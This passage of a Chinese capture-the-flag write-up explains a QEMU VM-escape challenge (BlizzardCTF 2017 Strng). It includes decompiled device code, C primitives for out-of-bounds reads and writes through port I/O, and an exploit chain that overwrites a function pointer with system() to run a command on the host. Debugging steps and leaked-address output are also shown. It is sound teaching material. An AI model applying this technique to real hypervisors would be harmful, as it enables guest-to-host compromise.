+          <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">idx</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">rand</span><span class="p">(</span><span class="n">opaque</span><span class="p">,</span> <span class="mi">4LL</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+          <span class="p">}</span>
+          <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">==</span> <span class="n">v6</span> <span class="p">)</span>
+              <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">srand</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">val</span><span class="p">);</span>
+          <span class="p">}</span>
+          <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">idx</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">rand_r</span><span class="p">(</span><span class="o">&amp;</span><span class="n">opaque</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">4LL</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+          <span class="p">}</span>
+          <span class="k">else</span>
+          <span class="p">{</span>
+            <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">addr</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>当<code>size</code>等于4时，以传入的端口地址为判断提供4个功能：</p>
+<ul>
+<li>
+<p>当端口地址为0时，直接将传入的<code>val</code>赋值给<code>opaque-&gt;addr</code>。</p>
+</li>
+<li>
+<p>当端口地址不为0时，将<code>opaque-&gt;addr</code>右移两位得到索引<code>i</code>，分为三个功能：</p>
+<ul>
+<li>
+<p><code>i</code>为0时，执行<code>srand</code>，返回值不存储。</p>
+</li>
+<li>
+<p><code>i</code>为1时，执行<code>rand</code>并将返回结果存储到<code>regs[1]</code>中。</p>
+</li>
+<li>
+<code>i</code>为3时，调用<code>rand_r</code>并将<code>regs[2]</code>作为第一个参数，返回值存储到<code>regs[3]</code>中。</li>
+<li>否则直接将<code>val</code>存储到<code>regs[idx]</code>中。</li>
+</ul>
+</li>
+</ul>
+<p>可以看到PMIO与MMIO的区别在于索引<code>regs</code>数组时，PMIO并不是由直接传入的端口地址<code>addr</code>去索引的；而是由<code>opaque-&gt;addr</code>去索引，而<code>opaque-&gt;addr</code>的赋值是我们可控的（端口地址为0时，直接将传入的<code>val</code>赋值给<code>opaque-&gt;addr</code>）。因此<code>regs</code>数组的索引可以为任意值，即可以越界读写。</p>
+<p>越界读则是首先通过<code>strng_pmio_write</code>去设置<code>opaque-&gt;addr</code>，然后再调用<code>pmio_read</code>去越界读。</p>
+<p>越界写则是首先通过<code>strng_pmio_write</code>去设置<code>opaque-&gt;addr</code>，然后仍然通过<code>pmio_write</code>去越界写。</p>
+<h4 data-content="1" id="0252ceee0da64649b873115659ac510b">编程访问PMIO</h4>
+<p><a href="https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html" target="_blank">UAFIO</a>描述说有三种方式访问PMIO，这里仍给出一个比较便捷的方法去访问，即通过<code>IN</code>以及 <code>OUT</code>指令去访问。可以使用<code>IN</code>和<code>OUT</code>去读写相应字节的1、2、4字节数据（outb/inb, outw/inw, outl/inl），函数的头文件为<code>&lt;sys/io.h&gt;</code>，函数的具体用法可以使用<code>man</code>手册查看。</p>
+<p>还需要注意的是要访问相应的端口需要一定的权限，程序应使用root权限运行。对于<code>0x000-0x3ff</code>之间的端口，使用<code>ioperm(from, num, turn_on)</code>即可；对于<code>0x3ff</code>以上的端口，则该调用执行<code>iopl(3)</code>函数去允许访问所有的端口（可使用<code>man ioperm</code> 和<code>man iopl</code>去查看函数）。</p>
+<p>典型代码如下：</p>
+<div class="highlight"><pre><span></span><span class="kt">uint32_t</span> <span class="n">pmio_base</span><span class="o">=</span><span class="mh">0xc050</span><span class="p">;</span>
+
+<span class="kt">uint32_t</span> <span class="nf">pmio_write</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">outl</span><span class="p">(</span><span class="n">value</span><span class="p">,</span><span class="n">addr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">uint32_t</span> <span class="nf">pmio_read</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">addr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">inl</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+
+    <span class="c1">// Open and map I/O memory for the strng device</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iopl</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">!=</span><span class="mi">0</span> <span class="p">)</span>
+        <span class="n">die</span><span class="p">(</span><span class="s">"I/O permission is not enough"</span><span class="p">);</span>
+        <span class="n">pmio_write</span><span class="p">(</span><span class="n">pmio_base</span><span class="o">+</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">pmio_write</span><span class="p">(</span><span class="n">pmio_base</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+
+<span class="p">}</span>
+</pre></div>
+<h2 data-content="1" id="65ddf826d1e9c03c312752696f1f0bc3">利用</h2>
+<p>首先是利用pmio来进行任意读写。</p>
+<ul>
+<li>
+<p>越界读：首先使用<code>strng_pmio_write</code>设置<code>opaque-&gt;addr</code>，即当<code>addr</code>为0时，传入的<code>val</code>会直接赋值给<code>opaque-&gt;addr</code>；然后再调用<code>strng_pmio_read</code>，就会去读<code>regs[val&gt;&gt;2]</code>的值，实现越界读，代码如下：</p>
+<div class="highlight"><pre><span></span><span class="kt">uint32_t</span> <span class="nf">pmio_arbread</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">pmio_write</span><span class="p">(</span><span class="n">pmio_base</span><span class="o">+</span><span class="mi">0</span><span class="p">,</span><span class="n">offset</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">pmio_read</span><span class="p">(</span><span class="n">pmio_base</span><span class="o">+</span><span class="mi">4</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+</li>
+<li>
+<p>越界写：仍然是首先使用<code>strng_pmio_write</code>设置<code>opaque-&gt;addr</code>，即当<code>addr</code>为0时，传入的<code>val</code>会直接赋值给<code>opaque-&gt;addr</code>；然后调用<code>strng_pmio_write</code>，并设置<code>addr</code>为4，即会去将此次传入的<code>val</code>写入到<code>regs[val&gt;&gt;2]</code>中，实现越界写，代码如下：</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">pmio_abwrite</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">pmio_write</span><span class="p">(</span><span class="n">pmio_base</span><span class="o">+</span><span class="mi">0</span><span class="p">,</span><span class="n">offset</span><span class="p">);</span>
+    <span class="n">pmio_write</span><span class="p">(</span><span class="n">pmio_base</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span><span class="n">value</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+</li>
+</ul>
+<p>完整的利用过程为：</p>
+<ol>
+<li>使用<code>strng_mmio_write</code>将<code>cat /root/flag</code>写入到<code>regs[2]</code>开始的内存处，用于后续作为参数。</li>
+<li>使用越界读漏洞，读取<code>regs</code>数组后面的<code>srand</code>地址，根据偏移计算出<code>system</code>地址。</li>
+<li>使用越界写漏洞，覆盖<code>regs</code>数组后面的<code>rand_r</code>地址，将其覆盖为<code>system</code>地址。</li>
+<li>最后使用<code>strng_mmio_write</code>触发执行<code>opaque-&gt;rand_r(&amp;opaque-&gt;regs[2])</code>函数，从而实现<code>system("cat /root/flag")</code>的调用，拿到flag。</li>
+</ol>
+<h3 data-content="1" id="601718b4f3b5c25fa04c6a86b6e6596a">调试</h3>
+<p>将完整流程描述了一遍以后，再说下怎么调试。</p>
+<p><code>sudo ./launsh.sh</code>将虚拟机跑起来以后，在本地将<a href="https://github.com/ray-cp/vm-escape/blob/master/qemu-escape/BlizzardCTF2017-Strng/exp.c" target="_blank">exp</a>用命令<code>make</code>编译通过，<code>makefile</code>内容比较简单：</p>
+<div class="highlight"><pre><span></span>ALL:
+        cc -m32 -O0 -static -o exp exp.c
+</pre></div>
+<p>然后使用命令<code>scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu</code>将exp拷贝到虚拟机中。</p>
+<p>若要调试qemu以查看相应的流程，可以使用<code>ps -ax|grep qemu</code>找到相应的进程；再<code>sudo gdb -attach [pid]</code>上去，然后在里面下断点查看想观察的数据，示例如下：</p>
+<div class="highlight"><pre><span></span>b *strng_pmio_write
+b *strng_pmio_read
+b *strng_mmio_write
+b *strng_pmio_read
+</pre></div>
+<p>然后再<code>sudo ./exp</code>执行exp，就可以愉快的调试了。</p>
+<p>一个小trick，可以使用<code>print</code>加上结构体可以很方便的查看数据（如果有符号的话）：</p>
+<div class="highlight"><pre><span></span>pwndbg&gt; print *<span class="o">(</span>STRNGState*<span class="o">)</span><span class="nv">$rdi</span>
+<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>
+  <span class="nv">pdev</span> <span class="o">=</span> <span class="o">{</span>
+    <span class="nv">qdev</span> <span class="o">=</span> <span class="o">{</span>
+      <span class="nv">parent_obj</span> <span class="o">=</span> <span class="o">{</span>
+        <span class="nv">class</span> <span class="o">=</span> 0x55de43a3f2e0,
+        <span class="nv">free</span> <span class="o">=</span> 0x7fc137fedba0 &lt;g_free&gt;,
+        <span class="nv">properties</span> <span class="o">=</span> 0x55de45283c00,
+        <span class="nv">ref</span> <span class="o">=</span> 0x13,
+...
+pwndbg&gt; print <span class="o">((</span>STRNGState*<span class="o">)</span><span class="nv">$rdi</span><span class="o">)</span>.regs
+<span class="nv">$3</span> <span class="o">=</span> <span class="o">{</span>0x0, 0x0, 0x1e28b6de, 0x6f6f722f, 0x6c662f74, 0x6761, 0x0 &lt;repeats <span class="m">58</span> times&gt;<span class="o">}</span>
+</pre></div>
+<p>最后可以看到成功的拿到了宿主机下面的flag：</p>
+<div class="highlight"><pre><span></span>leaking srandom addr: 0x7fc137211bb0
+libc base: 0x7fc1371ce000
+system addr: 0x7fc13721d440
+leaking heap addr: 0x55de43b35ef0
+parameter addr: 0x55de43b6fb6c
+flag<span class="o">{</span>welcome_to_the_qeme_world<span class="o">}</span>
+</pre></div>
+<h2 data-content="1" id="90afb84ec3586a923f7cd6f64131137e">小结</h2>
+<p>学到了很多的东西，也看到了很多的东西要学。</p>
+<p>相关文件和脚本<a href="https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/BlizzardCTF2017-Strng" target="_blank">链接</a></p>
+<h2 data-content="1" id="475835263dbd0c381e8d8781d97b0ba3">参考链接</h2>
+<ol>
+<li><a href="https://github.com/rcvalle/blizzardctf2017" target="_blank">Blizzard CTF 2017: Sombra True Random Number Generator (STRNG)</a></li>
+<li><a href="https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html" target="_blank">BlizzardCTF 2017 - Strng</a></li>
+<li><a href="https://www.w0lfzhang.com/2018/11/05/Blizzard-CTF-2017-Strng/" target="_blank">Blizzard CTF 2017 Strng</a></li>
+</ol>
+</div>
+</div>
